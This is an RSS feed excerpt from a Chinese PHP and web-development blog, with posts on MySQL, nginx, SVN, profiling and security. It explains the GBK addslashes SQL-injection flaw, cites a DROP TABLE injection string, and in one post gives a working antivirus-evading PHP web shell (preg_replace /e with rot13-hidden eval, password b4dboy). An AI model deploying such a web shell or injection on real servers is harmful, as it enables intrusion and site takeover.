      <pubDate>Thu, 22 May 2014 07:51:14 +0000</pubDate>
      
      <guid>https://ifunbox.top/gbk_addslashes_mysql_real_escape_string_injection/</guid>
      <description>该漏洞最早2006年被国外用来讨论数据库字符集设为GBK时，0xbf27本身不是一个有效的GBK字符，但经过 addslashes() 转换后变为0xbf5c27，前面的0xbf5c是个有效的GBK字符，所以0xbf5c27会被当作一个字符0xbf5c和一个单引号来处理，结果漏洞就触发了。
mysql_real_escape_string() 也存在相同的问题，只不过相比 addslashes() 它考虑到了用什么字符集来处理，因此可以用相应的字符集来处理字符。在MySQL 中有两种改变默认字符集的方法。
方法一： 改变mysql配置文件my.cnf [client] default-character-set=GBK 方法二： 在建立连接时使用 SET CHARACTER SET &#39;GBK&#39; 例：mysql_query(&amp;quot;SET CHARACTER SET &#39;gbk&#39;&amp;quot;, $c);  问题是方法二在改变字符集时mysql_real_escape_string() 并不知道而使用默认字符集处理从而造成和 addslashes() 一样的漏洞
&amp;lt;?php
$c = mysql_connect(&amp;ldquo;localhost&amp;rdquo;, &amp;ldquo;user&amp;rdquo;, &amp;ldquo;pass&amp;rdquo;); mysql_select_db(&amp;ldquo;database&amp;rdquo;, $c);
// change our character set mysql_query(&amp;ldquo;SET CHARACTER SET &amp;lsquo;gbk&amp;rsquo;&amp;rdquo;, $c);
// create demo table mysql_query(&amp;ldquo;CREATE TABLE users ( username VARCHAR(32) PRIMARY KEY, password VARCHAR(32) ) CHARACTER SET &amp;lsquo;GBK&amp;rsquo;&amp;ldquo;, $c); mysql_query(&amp;ldquo;INSERT INTO users VALUES(&amp;lsquo;foo&amp;rsquo;,&amp;lsquo;bar&amp;rsquo;), (&amp;lsquo;baz&amp;rsquo;,&amp;lsquo;test&amp;rsquo;)&amp;rdquo;, $c);</description>
    </item>
    
    <item>
      <title>基于bcrypt算法-开源phpass库来保护密码</title>
      <link>https://ifunbox.top/phpass_bcrypt_encrypted_password/</link>
      <pubDate>Wed, 09 Apr 2014 06:54:14 +0000</pubDate>
      
      <guid>https://ifunbox.top/phpass_bcrypt_encrypted_password/</guid>
      <description>在存入数据库之前进行哈希计算成为保护用户密码的标准方式，许多常用的哈希算法如md5,甚至是sha1 对于密码存储都是不安全的，因为骇客能够使用那些算法轻而易举地破解密码。
对密码进行哈希最安全的方法是使用bcrypt算法。开源的phpass库以一个易于使用的类来提供该功能。
&amp;amp;lt;?php // Include the phpass library require_once(&#39;phpass-03/PasswordHash.php&#39;) // Initialize the hasher without portable hashes (this is more secure) $hasher = new PasswordHash(8, false); // Hash the password. $hashedPassword will be a 60-character string. $hashedPassword = $hasher-&amp;amp;gt;HashPassword(&#39;my super cool password&#39;); // You can now safely store the contents of $hashedPassword in your database! // Check if a user has provided the correct password by comparing what they // typed with our hash $hasher-&amp;amp;gt;CheckPassword(&#39;the wrong password&#39;, $hashedPassword); // false $hasher-&amp;amp;gt;CheckPassword(&#39;my super cool password&#39;, $hashedPassword); // true ?</description>
    </item>
    
    <item>
      <title>owasp php filters介绍以及使用–过滤非法输入PHP函数库</title>
      <link>https://ifunbox.top/owasp_php_filters/</link>
      <pubDate>Fri, 28 Mar 2014 08:14:37 +0000</pubDate>
      
      <guid>https://ifunbox.top/owasp_php_filters/</guid>
      <description>最近在研究关于php安全的问题，无意中看到使用 PHP 构建的 Web 应用如何避免 XSS 攻击，很受启发，尤其是字符集编码、动态内容为JavaScript事件处理函数的参数、动态内容位于 JavaScript 代码段中时的xss攻击，建议大家都看看，今天要介绍的owasp php filters也是从这篇文章中看到的。
首先先介绍下owasp，开放Web应用程序安全性项目(OWASP)501&amp;copy;(3)全球非营利慈善组织专注于改进的安全软件。进他们的项目主页，项目好多，关于php也有不少，不过有几个很好的安全项目还没有提供相关类库的下载，想杀人的冲动。。。。
owasp php filters的主页是https://www.owasp.org/index.php/OWASP_PHP_Filters，里面有关于一些安全过滤函数的介绍，
项目下载地址http://sourceforge.net/project/showfiles.php?group_id=64424&amp;amp;package_id=106757
&amp;nbsp;
核心文件是sanitize.php，index.php是提供给大家测试安全过滤函数用的，test.php过滤输出结果页。
介绍几个常用的函数：
sanitize_sql_string函数用来过滤sql输入参数，该函数addslashes了下，又去除了;，去除；主要是防止 x&amp;#8217;; DROP TABLE members; &amp;#8212; 这种攻击。
sanitize_html_string函数用来过滤html的输出，相比htmlspecialchars函数，sanitize_html_string函数过滤了更多的特殊字符，但是感觉还是不是很给力，HTML Purifier才是首选，地址是http://htmlpurifier.org/。
在学习的过程中，我也发现了一些很给力的php自带函数比如filter_var，该函数不仅提供邮箱、ip的验证，还提供了一些安全过滤功能。</description>
    </item>
    
    <item>
      <title>Tamper Data使用–WEB服务器调试/XSS攻击/sql注入利器</title>
      <link>https://ifunbox.top/tamper_data_xss_sql_injection/</link>
      <pubDate>Thu, 27 Mar 2014 03:37:11 +0000</pubDate>
      
      <guid>https://ifunbox.top/tamper_data_xss_sql_injection/</guid>
      <description>一. 简介 作为 Firefox 的插件， Tamper Data 简单易用，功能强大，可以用来查看和修改 HTTP/HTTPS 的头部和 POST 参数；可以用来跟踪 HTTP 请求和响应并记时；可以对 WEB 站点进行某些安全测试，从而为调试 WEB 配置带来了极大的便利，是网站维护人员不可多得的实用工具；当然也可以用来篡改请求数据，达到xss攻击、mysql注入的目的。
安装地址：https://addons.mozilla.org/en-us/firefox/addon/tamper-data/
二. 使用 点击 Firefox 菜单栏上“工具”菜单项里面的“Tamper Data”，就会弹出 Tamper Data 的主窗口，如下图所示：

&amp;nbsp;
可以看出，其主窗口主要分成三部分，分别如图中的 1，2，3 所示。当我们打开 Tamper Data 后，我们浏览网页时发出的每一个 HTTP 请求及其对应的响应都会被 Tamper Data 记录下来，上面的区域显示了浏览器的各个通信情况。类似Firefox下著名的抓包扩展Httpfox，这里详细记录了：“网址”、“所耗时间”、“页面大小”、“请求方式”、“状态”、“Content Type”等信息。
第 1 部分显示每一个 HTTP 请求及其对应的 HTTP 响应的概要信息，其中包括了大量有用的信息，比如页面元素大小，HTTP 请求的方法，HTTP 响应的状态值，等等。最 值得注意的是“Duration”和“Total Duration”这两个字段的值，他们显示出了打开每一个页面元素所花费的时间和打开该页面花费的总时间。根据这些时间值，就可以判断出打开我们页面的 速度如何，是哪些页面元素影响了整个页面打开的速度，从而为我们进一步优化页面提供宝贵的信息。当我们在第 1 部分选中某条概要信息后。
第 2 部分会显示出对应的 HTTP 请求的头部信息。
第 3 部分会显示出对应的 HTTP 响应的头部信息。
如果我们比较喜欢查看图型化的统计信息，那么可以在 Tamper Data 主窗口的第 1 部分单击右键，在弹出的菜单上点击“Graph All”，如下图所示，那么这些每个页面元素及其打开它们所花费的时间，就会以图形的方式，直观地显示出来。具体的图形，就不提供了。</description>
    </item>
    
    <item>
      <title>coreseek/sphinx 安装错误[indexer][all][all-recursive][sphinx.o]Error</title>
      <link>https://ifunbox.top/coreseek_sphinx_all-recursive_sphinx.o_error</link>
      <pubDate>Mon, 17 Mar 2014 06:21:35 +0000</pubDate>
      
      <guid>https://ifunbox.top/coreseek_sphinx_all-recursive_sphinx.o_error</guid>
      <description>今天参照官方安装教程安装coreseek出现两个错误，这里记录备忘下
第一个错误
Internal error: Killed (program cc1plus)
make[2]:  [sphinx.o] error
make[2]:Leaving directory &amp;#8216;/root/coreseek-3.2.14/csft-3.2.14/src&amp;#8217;
make[1]:  [all] error 2
make[1]:Leaving directory &amp;#8216;/root/coreseek-3.2.14/csft-3.2.14/src&amp;#8217;
make: *** [all-recursive] error 1
上网查了下是内存不足导致的，尴尬，关闭了ng、mysql，顺利跑过了
第二个错误
/usr/bin/ld: cannot find -lexpat
collect2: ld returned 1 exit status
make[2]: *** [indexer] Error 1
make[2]: Leaving directory /root/coreseek-3.2.14/csft-3.2.14/src&amp;amp;#8217;&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;make[1]: *** [all] Error 2&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;make[1]: Leaving directory/root/coreseek-3.2.14/csft-3.2.14/src&amp;#8217;
make: *** [all-recursive] Error 1
解决
一开始以为libiconv的问题，又重装了几次还是一样，最后终于找着办法了
编辑：
./src/MakeFile文件
将</description>
    </item>
    
    <item>
      <title>PHP性能分析工具-xhprof扩展的安装以及使用</title>
      <link>https://ifunbox.top/xhprof_php_analysis_tool/</link>
      <pubDate>Thu, 06 Mar 2014 03:10:52 +0000</pubDate>
      
      <guid>https://ifunbox.top/xhprof_php_analysis_tool/</guid>
      <description>简述 XHProf是一个分层PHP性能分析工具。它报告函数级别的请求次数和各种指标，包括阻塞时间，CPU时间和内存使用情况。一个函数的开销，可细分成调用者和被调用者的开销，XHProf数据收集阶段，它记录调用次数的追踪和包容性的指标弧在动态callgraph的一个程序。它独有的数 据计算的报告/后处理阶段。在数据收集时，XHProf通过检测循环来处理递归的函数调用，并通过给递归调用中每个深度的调用一个有用的命名来避开死循 环。XHProf分析报告有助于理解被执行的代码的结构，它有一个简单的HTML的用户界面（ PHP写成的）。基于浏览器的性能分析用户界面能更容易查看，或是与同行们分享成果。也能绘制调用关系图。 安装 xhprof扩展的安装： % wget http://pecl.php.net/get/xhprof-0.9.4.tgz % tar zxf xhprof-0.9.4.tgz % cd &amp;amp;lt;xhprof_source_directory&amp;amp;gt;/extension/ % phpize % ./configure --with-php-config=&amp;amp;lt;path to php-config&amp;amp;gt; % make &amp;amp;&amp;amp; make install  修改php.ini最后面加入
[xhprof] extension=xhprof.so ; ; directory used by default implementation of the iXHProfRuns ; interface (namely, the XHProfRuns_Default class) for storing ; XHProf runs. ; xhprof.output_dir=&amp;amp;lt;directory_for_storing_xhprof_runs&amp;amp;gt; //日志路径需要修改 记得给写权限 % php-fpm reload //重启一下fpm  Graphviz安装（这个主要是画图需要的库） % wget http://www.graphviz.org/pub/graphviz/stable/SOURCES/graphviz-2.24.0.tar.gz % tar zxf graphviz-2.</description>
    </item>
    
    <item>
      <title>Apache/Nginx Basic HTTP Authentication用户认证</title>
      <link>https://ifunbox.top/apache_nginx_basic_http_authentication/</link>
      <pubDate>Sun, 16 Feb 2014 14:55:21 +0000</pubDate>
      
      <guid>https://ifunbox.top/apache_nginx_basic_http_authentication/</guid>
      <description>由于wordpress的特殊性，后台地址一致不好修改，导致后台不是很安全，通过 Basic HTTP Authentication用户认证给后台在加一层密码验证，这样wp就更安全一些了~~
今天研究了下基于Basic HTTP Authentication对一个或多个目录下的文件提供密码保护。
1.apache下的实现方法
AuthType Basic
AuthName &amp;#8220;My Protected Area&amp;#8221;
AuthUserFile /path/to/.htpasswd
Require valid-user
参数的含义：AuthType认证类型，AuthName访问被保护文件后的提示语，AuthUserFile密码文件存储路径
网上有个自动生成验证.htaccess的网站，点击这里
密码文件.htpasswd自动生成地址，点击这里
2.nginx下的实现方法
在nginx.conf中的虚拟主机配置：
location ^~ /phpmyadmin/{
auth_basic &amp;#8220;phpmyadmin admin&amp;#8221;;
auth_basic_user_file /var/www/.htpasswd;
}
参数的含义：auth_basic访问被保护文件后的提示语，auth_basic_user_file密码文件存储路径（这里密码文件都可以用apache生成的密码文件），具有参数介绍，点击这里
配置完毕后都需要重启服务</description>
    </item>
    
    <item>
      <title>解决Nginx下WordPress后台链接wp-admin消失的问题</title>
      <link>https://ifunbox.top/nginx_wordpress_wp-admin_display/</link>
      <pubDate>Thu, 13 Feb 2014 08:35:54 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx_wordpress_wp-admin_display/</guid>
      <description>服务器换到阿里云，环境变成LNMP后，wordpress后台操作都404了，查看了下发现链接都少了wp-admin。
直接访问后台，如xxxx.com/wp-admin少了一个/导致，如果手动加入/就一切正常~~
查一下才发现原来是nginx的问题，这样以来我这中症状就不是个例了，于是去官方文档上搜了一下。
http://codex.wordpress.org/Nginx
解决方式在伪静态文件中加入
# Add trailing slash to */wp-admin requests. rewrite /wp-admin$ $scheme://$host$uri/ permanent; </description>
    </item>
    
    <item>
      <title>php五大运行模式 CGI FAST-CGI CLI ISAPI APACHE模式</title>
      <link>https://ifunbox.top/php_run_mode/</link>
      <pubDate>Thu, 13 Feb 2014 08:05:38 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_run_mode/</guid>
      <description>CGI:
CGI即通用网关接口(Common Gateway Interface)，它是一段程序, 通俗的讲CGI就象是一座桥，把网页和WEB服务器中的执行程序连接起来，它把HTML接收的指令传递给服务器的执行程序，再把服务器执行程序的结果返还给HTML页，也可以简单的理解成HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。
CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php,perl,tcl等
CGI 的跨平台性能极佳，几乎可以在任何操作系统上实现。
每有一个用户请求，都会激活一个CGI进程，当用户请求数量非常多时，会大量挤占系统的资源如内存，CPU时间等，造成效能低下。
Isapi:
ISAPI即Internet Server Application Program Interface，是微软提供的一套面向Internet服务的API接口一个ISAPI的DLL，可以在被用户请求激活后长驻内存，等待用户的另一个请求，还可以在一个DLL里设置多个用户请求处理函数，此外，ISAPI的DLL应用程序和WWW服务器处于同一个进程中，效率要显著高于CGI。（由于微软的排他性，只能运行于windows环境)
fast-cgi:
FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次(这是CGI最为人诟病的fork-and-execute 模式)。它还支持分布式的运算, 即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。
FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。
cli:
cli是php的命令行运行模式，大家经常会使用它，但是可能并没有注意到（例如：我们在linux下经常使用 &amp;#8220;php -m&amp;#8221;查找PHP安装了那些扩展就是PHP命令行运行模式。
可以输入php -h去深入研究该运行模式。
apache:
APACHE2HANDLER
PHP作为Apache模块，Apache服务器在系统启动后，预先生成多个进程副本驻留在内存中，一旦有请求出 现，就立即使用这些空余的子进程进行处理，这样就不存在生成子进程造成的延迟了。这些服务器副本在处理完一次HTTP请求之后并不立即退出，而是停留在计 算机中等待下次请求。对于客户浏览器的请求反应更快，性能较高。
apache模块的DLL:
该运行模式是我们以前在windows环境下使用apache服务器经常使用的，而在模块化(DLL)中，PHP是与Web服务器一起启动并运行的。（是apache在CGI的基础上进行的一种扩展，加快PHP的运行效率）</description>
    </item>
    
    <item>
      <title>linux svn版本库/数据迁移</title>
      <link>https://ifunbox.top/linux_svn_move/</link>
      <pubDate>Sat, 01 Feb 2014 15:17:14 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_svn_move/</guid>
      <description>1.源服务器:A
使用svnadmin dump指令将源服务器上的svn库备份成一个文件fanhefan是版本库
将/data/svndata/fanhefan库备份成svn_bak 文件,操作如下:
svnadmin dump /data/svndata/fanhefan&amp;gt; /root/svn_bak
配置文件放在/data/svndata目录下conf 里面有passwd authz 
并将fanhefan/conf中的svnserve.conf一并复制打包.
备份之后可以将其压缩并传到B服务器上tar czf svn_bak.tar.gz svn_bak
———————————
2.目标服务器: B
目标服务器上请先安装:linux下安装配置svn服务器:
将A服务器传过来的/root/svn_bak.tar.gz 解压/root/svn_bak 文件
同样的,将版本库创建在 /data/new/svndata/fanhefan,使用指令如下:
svnadmin create /data/new/svndata/fanhefan
并将原来服务器上的配置COPY过来.
还原svn版本库如下:
svnadmin load /data/new/svndata/fanhefan&amp;lt; /root/svn_bak
请一个记住:svnadmin load 版本库的时侯,库一定要干净的,即(svnadmin create /data/new/svndata/fanhefan) 之后新的.
导入成功即还原完成.
迁移完成
最后发现路径都变更了，郁闷啊，最后用客户端的浏览功能copy到之前路径解决了~</description>
    </item>
    
    <item>
      <title>mysql 性能优化方案</title>
      <link>https://ifunbox.top/optimize_mysql/</link>
      <pubDate>Sun, 24 Nov 2013 11:01:51 +0000</pubDate>
      
      <guid>https://ifunbox.top/optimize_mysql/</guid>
      <description>网上有不少mysql 性能优化方案，不过，mysql的优化同sql server相比，更为麻烦与负责，同样的设置，在不同的环境下 ，由于内存，访问量，读写频率，数据差异等等情况，可能会出现不同的结果，因此简单地根据某个给出方案来配置mysql是行不通的，最好能使用 status信息对mysql进行具体的优化，网上找了一篇文章，分页分得乱七八糟的，只能转到博客。
 &amp;lt;span style=&amp;ldquo;font-family: nsimsun;&amp;ldquo;&amp;gt;mysql&amp;gt; show global status; &amp;lt;/span&amp;gt;
 可以列出mysql服务器运行各种状态值，另外，查询mysql服务器配置信息语句：
 &amp;lt;span style=&amp;ldquo;font-family: nsimsun;&amp;ldquo;&amp;gt;mysql&amp;gt; show variables; &amp;lt;/span&amp;gt;
 一、慢查询
 &amp;lt;span style=&amp;ldquo;font-family: nsimsun;&amp;ldquo;&amp;gt;mysql&amp;gt; show variables like ‘%slow%‘;&amp;lt;br /&amp;gt; +&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;+&amp;mdash;&amp;mdash;-+&amp;lt;br /&amp;gt; | variable_name　| value |&amp;lt;br /&amp;gt; +&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;+&amp;mdash;&amp;mdash;-+&amp;lt;br /&amp;gt; | log_slow_queries | on　|&amp;lt;br /&amp;gt; | slow_launch_time | 2　|&amp;lt;br /&amp;gt; +&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;+&amp;mdash;&amp;mdash;-+&amp;lt;/span&amp;gt;
mysql&amp;gt; show global status like ‘%slow%‘;
+&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;+&amp;#8212;&amp;#8212;-+
| variable_name　| value |
+&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;+&amp;#8212;&amp;#8212;-+
| slow_launch_threads | 0　|</description>
    </item>
    
    <item>
      <title>用PHP提取中英文词语以及数字的首字母的方法介绍</title>
      <link>https://ifunbox.top/php_get_initial/</link>
      <pubDate>Mon, 04 Nov 2013 12:53:09 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_get_initial/</guid>
      <description>最近项目有个需求，在一个中英文（包括阿拉伯数字0-9）的海量词库中，提取每一个词语的首字母：
gannicus——&amp;gt;G
自由自在——&amp;gt;Z
2B——&amp;gt;E
傻X——&amp;gt;S
&amp;nbsp;
&amp;nbsp;
function get_first_char($string){ $s=iconv(&#39;UTF-8&#39;,&#39;gb2312&#39;, $string); if (ord($string)&amp;amp;gt;128) { //汉字开头 $asc=ord($s{0})*256+ord($s{1})-65536; if($asc&amp;amp;gt;=-20319 and $asc&amp;amp;lt;=-20284)return &amp;quot;A&amp;quot;; if($asc&amp;amp;gt;=-20283 and $asc&amp;amp;lt;=-19776)return &amp;quot;B&amp;quot;; if($asc&amp;amp;gt;=-19775 and $asc&amp;amp;lt;=-19219)return &amp;quot;C&amp;quot;; if($asc&amp;amp;gt;=-19218 and $asc&amp;amp;lt;=-18711)return &amp;quot;D&amp;quot;; if($asc&amp;amp;gt;=-18710 and $asc&amp;amp;lt;=-18527)return &amp;quot;E&amp;quot;; if($asc&amp;amp;gt;=-18526 and $asc&amp;amp;lt;=-18240)return &amp;quot;F&amp;quot;; if($asc&amp;amp;gt;=-18239 and $asc&amp;amp;lt;=-17923)return &amp;quot;G&amp;quot;; if($asc&amp;amp;gt;=-17922 and $asc&amp;amp;lt;=-17418)return &amp;quot;I&amp;quot;; if($asc&amp;amp;gt;=-17417 and $asc&amp;amp;lt;=-16475)return &amp;quot;J&amp;quot;; if($asc&amp;amp;gt;=-16474 and $asc&amp;amp;lt;=-16213)return &amp;quot;K&amp;quot;; if($asc&amp;amp;gt;=-16212 and $asc&amp;amp;lt;=-15641)return &amp;quot;L&amp;quot;; if($asc&amp;amp;gt;=-15640 and $asc&amp;amp;lt;=-15166)return &amp;quot;M&amp;quot;; if($asc&amp;amp;gt;=-15165 and $asc&amp;amp;lt;=-14923)return &amp;quot;N&amp;quot;; if($asc&amp;amp;gt;=-14922 and $asc&amp;amp;lt;=-14915)return &amp;quot;O&amp;quot;; if($asc&amp;amp;gt;=-14914 and $asc&amp;amp;lt;=-14631)return &amp;quot;P&amp;quot;; if($asc&amp;amp;gt;=-14630 and $asc&amp;amp;lt;=-14150)return &amp;quot;Q&amp;quot;; if($asc&amp;amp;gt;=-14149 and $asc&amp;amp;lt;=-14091)return &amp;quot;R&amp;quot;; if($asc&amp;amp;gt;=-14090 and $asc&amp;amp;lt;=-13319)return &amp;quot;S&amp;quot;; if($asc&amp;amp;gt;=-13318 and $asc&amp;amp;lt;=-12839)return &amp;quot;T&amp;quot;; if($asc&amp;amp;gt;=-12838 and $asc&amp;amp;lt;=-12557)return &amp;quot;W&amp;quot;; if($asc&amp;amp;gt;=-12556 and $asc&amp;amp;lt;=-11848)return &amp;quot;X&amp;quot;; if($asc&amp;amp;gt;=-11847 and $asc&amp;amp;lt;=-11056)return &amp;quot;Y&amp;quot;; if($asc&amp;amp;gt;=-11055 and $asc&amp;amp;lt;=-10247)return &amp;quot;Z&amp;quot;; }else if(ord($s)&amp;amp;gt;=48 and ord($s)&amp;amp;lt;=57){ //数字开头 switch(iconv_substr($s,0,1,&#39;utf-8&#39;)) { case 1:return &amp;quot;Y&amp;quot;; case 2:return &amp;quot;E&amp;quot;; case 3:return &amp;quot;S&amp;quot;; case 4:return &amp;quot;S&amp;quot;; case 5:return &amp;quot;W&amp;quot;; case 6:return &amp;quot;L&amp;quot;; case 7:return &amp;quot;Q&amp;quot;; case 8:return &amp;quot;B&amp;quot;; case 9:return &amp;quot;J&amp;quot;; case 0:return &amp;quot;L&amp;quot;; } }else if(ord($s)&amp;amp;gt;=65 and ord($s)&amp;amp;lt;=90){ //大写英文开头 return substr($s,0,1); }else if(ord($s)&amp;amp;gt;=97 and ord($s)&amp;amp;lt;=122){ //小写英文开头 return strtoupper(substr($s,0,1)); } else { return iconv_substr($s0,0,1,&#39;utf-8&#39;);//中英混合的词语，不适合上面的各种情况，因此直接提取首个字符即可 } }  </description>
    </item>
    
    <item>
      <title>什么是HttpOnly</title>
      <link>https://ifunbox.top/what_is_httponly/</link>
      <pubDate>Sat, 26 Oct 2013 14:39:37 +0000</pubDate>
      
      <guid>https://ifunbox.top/what_is_httponly/</guid>
      <description>1.什么是HttpOnly?

如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击
具体一点的介绍请google进行搜索


2.javaEE的API是否支持?

目前sun公司还没有公布相关的API，但PHP、C#均有实现。搞javaEE的兄弟们比较郁闷了，别急下文有变通实现

3.HttpOnly的设置样例

javaEE
   Javaee代码      response.setHeader(&amp;#8220;Set-Cookie&amp;#8221;, &amp;#8220;cookiename=value;    Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&amp;#8221;);    
   Javaee代码     response.setHeader(&amp;#8220;Set-Cookie&amp;#8221;, &amp;#8220;cookiename=value;    Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&amp;#8221;);    

具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取

   Java代码      Cookie cookies[]=request.getCookies();    
   Java代码     Cookie cookies[]=request.</description>
    </item>
    
    <item>
      <title>php、mysql两个经纬度之间的距离的方法</title>
      <link>https://ifunbox.top/php_mysql_distance/</link>
      <pubDate>Wed, 23 Oct 2013 09:08:06 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_mysql_distance/</guid>
      <description>php计算两个经纬度之间的距离的方法   /**
* 函数用途描述 计算经纬度 计算弧度
* @date: 2013-8-26
* @author: fanhe
* @return: 
*/
function rad($d)
{
return $d * 3.1415926535898 / 180.0;
}  /**
* 函数用途描述 计算经纬度距离
* @date: 2013-8-26
* @author: fanhe
* @return:
*/
function get_distance($lng1, $lat1, $lng2, $lat2)
{
$EARTH_RADIUS = 6378.137;
$radLat1 = rad($lat1);
//echo $radLat1;
$radLat2 = rad($lat2);
$a = $radLat1 &amp;#8211; $radLat2;
$b = rad($lng1) &amp;#8211; rad($lng2);
$s = 2 * asin(sqrt(pow(sin($a/2),2) +</description>
    </item>
    
    <item>
      <title>避开eval关键字，打造免杀一句话木马</title>
      <link>https://ifunbox.top/php_anti-antivirus-/</link>
      <pubDate>Tue, 08 Oct 2013 01:33:42 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_anti-antivirus-/</guid>
      <description>首先我想到的是将eval从字符串类型赋给一个变量。
如：$func = ‘phpinfo’;
$func();
这样的确是可以运行phpinfo()的，但是eval却不能通过这样来执行，我马上又想到了assert函数，他有着类似eval的功能，但效果并不理想，完全没有eval用着爽，而且也是公开了的，所以我也就将他放弃了。
还记得《20 Ways to Fuzzing PHP Source Code》里提到的preg_replace代码执行漏洞吗？
没错，利用preg_replace的模式修饰符e（PREG_REPLACE_EVAL）就可以将替换后的字符串作为php代码评估运行(eval函数方式)。
既然是将字符串作为php代码评估运行，哪么完全可以替换或者转码一下eval，这样就可以避开关键字了。
我的一句话木马如下：
 ($b4dboy = $_POST[&amp;#8216;b4dboy&amp;#8217;]) &amp;amp;&amp;amp; @preg_replace(‘/ad/e’,&amp;#8217;@’.str_rot13(‘riny’).’($b4dboy)’, ’add’);  使用上跟原来的一句话没有区别，可用常用的客户端连接密码b4dboy。
str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果。
转载请注明版权，谢谢！http://hi.baidu.com/b4dboy</description>
    </item>
    
    <item>
      <title>修复shopex4.8.5.80797列表无法快速编辑(切换是否状态)</title>
      <link>https://ifunbox.top/fix_shopex_quick_edit/</link>
      <pubDate>Sat, 14 Sep 2013 04:56:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/fix_shopex_quick_edit/</guid>
      <description>shopex是一个很好的免费系统，不过最新官方升级越来越含糊，导致升级到最新版，修复了bug漏洞，但是旧功能出现各种各样的问题。
shopex4.8.5.80797列表无法快速编辑就是最近我发现的问题
出现的原因估计是跟数据库字段1,0修改成true,false有关
现在提供解决方案。
下载修复补丁地址:http://url.cn/KR4AIa</description>
    </item>
    
    <item>
      <title>Centos如何挂载硬盘</title>
      <link>https://ifunbox.top/centos_mount_disk/</link>
      <pubDate>Thu, 12 Sep 2013 07:02:34 +0000</pubDate>
      
      <guid>https://ifunbox.top/centos_mount_disk/</guid>
      <description>远程SSH登录上Centos服务器后，进行如下操作
提醒：挂载操作会清空数据，请确认挂载盘无数据或者未使用
第一步：列出所有磁盘 命令： ll /dev/disk/by-path

提示：如果无法确认数据盘设备名称，请使用df命令来确认系统盘的名称，从而排除挂错盘的情况。
第二步：格式化硬盘 命令： fdisk /dev/sdb

注意：图中箭头标注处续手动键入
第三步：创建分区  命令： mkfs.ext4 /dev/sdb1

第四步：挂载分区 命令： mkdir /data
mount /dev/sdb1 /data # 将sdb这个硬盘挂载成为/data

**第五步：将信息写入fstab,让系统开启自动挂载。
** 命令： echo &amp;#8220;/dev/sdb1 /data ext4 defaults 0 0&amp;#8221; &amp;gt;&amp;gt; /etc/fstab</description>
    </item>
    
    <item>
      <title>ThinkPHP实现伪静态如何去掉目录中的index.php</title>
      <link>https://ifunbox.top/thinkphp_remove_index.php</link>
      <pubDate>Fri, 06 Sep 2013 09:35:38 +0000</pubDate>
      
      <guid>https://ifunbox.top/thinkphp_remove_index.php</guid>
      <description>ThinkPHP中默认的URL地址是形如这样的：http://localhost/Myapp/index.php/Index/index/
Myapp是我的项目文件名，默认的访问地址是上面这样的。为了使URL更加简介友好，现在要去掉中间的index.php，方法如下：
1。确认httpd.conf配置文件中加载了mod_rewrite.so 模块，加载的方法是去掉mod_rewrite.so前面的注释#号
2。讲httpd.conf中的Allowoverride None 将None改为All
3。打开对应的项目配置文件，我的项目配置文件是Myapp/Conf/config.php ,在这个配置文件数组中增加一行，‘URL_MODEL’=&amp;gt;2
4。在项目的根目录下面建立一个.htaccess文件，里面写入下面的内容：

RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]

如果你的服务器支持rewrite，现在就可以通过http://localhost/Myapp/Index/index/访问Index模块下面的index操作。</description>
    </item>
    
    <item>
      <title>解决PHPExcel导出长数字末尾几位数为0的问题</title>
      <link>https://ifunbox.top/php_excel_remove_zero/</link>
      <pubDate>Wed, 28 Aug 2013 03:25:33 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_excel_remove_zero/</guid>
      <description> 在做充值卡号和密码导出Excel的时候遇到了问题，数字的后两位总是0；  经查  在Excel中默认“常规”情况下，单元格中能完全显示的数据只有11位，超过11位，系统自动用科学记数显示。
当单元格格式设置为“数值”、小数点位数为0时，最多也只能完全显示15位数字，超过15位，从16位开始显示为0。  完整显示输入的所有数字，可以采用下述方法之一：
一是首先输入一英文单引号再输入数字。
二是把数据区域设置成“文本”格式后再输入数字。    在PHPExcel中解决的办法  //输出单元格值  //之前的部分代码  $objActSheet-setCellValue(&amp;#8216;B&amp;#8217;.$i, $value[&amp;#8220;CARDNO&amp;#8221;]);
$objActSheet-setCellValue(&amp;#8216;C&amp;#8217;.$i, $value[&amp;#8220;CARDPWD&amp;#8221;]);  //之后的部分代码  $objActSheet-setCellValue(&amp;#8216;B&amp;#8217;.$i, &amp;#8221; &amp;#8220;.$value[&amp;#8220;CARDNO&amp;#8221;]);
